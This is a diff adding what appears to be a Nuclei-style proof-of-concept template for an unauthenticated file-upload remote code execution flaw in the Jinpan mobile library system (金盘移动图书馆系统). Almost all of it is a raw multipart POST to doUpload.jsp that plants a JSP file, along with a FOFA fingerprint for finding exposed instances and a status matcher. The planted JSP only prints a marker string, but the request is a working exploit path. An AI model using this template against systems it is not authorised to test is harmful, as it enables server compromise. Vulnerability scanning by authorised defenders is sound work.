@@ -1,0 +1,65 @@
+id: poc-xlfgy9hr56erxina
+info:
+  name: 金盘移动图书馆系统 doUpload RCE漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/xlfgy9hr56erxina'
+  tags: rce,file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: xlfgy9hr56erxina
+    fofa: app="金盘软件-金盘移动图书馆系统"
+http:
+- raw:
+  - 'POST /pages/admin/tools/uploadFile/doUpload.jsp HTTP/1.1
+
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+
+    Connection: close
+
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary5iALAXlSiqxJXrhK
+
+
+
+
+    ------WebKitFormBoundary5iALAXlSiqxJXrhK
+
+
+    Content-Disposition: form-data; name="file";filename="dudesite.jsp"
+
+
+
+
+    <% out.println("dudesite"); %>
+
+
+    ------WebKitFormBoundary5iALAXlSiqxJXrhK--
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    .jsp
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
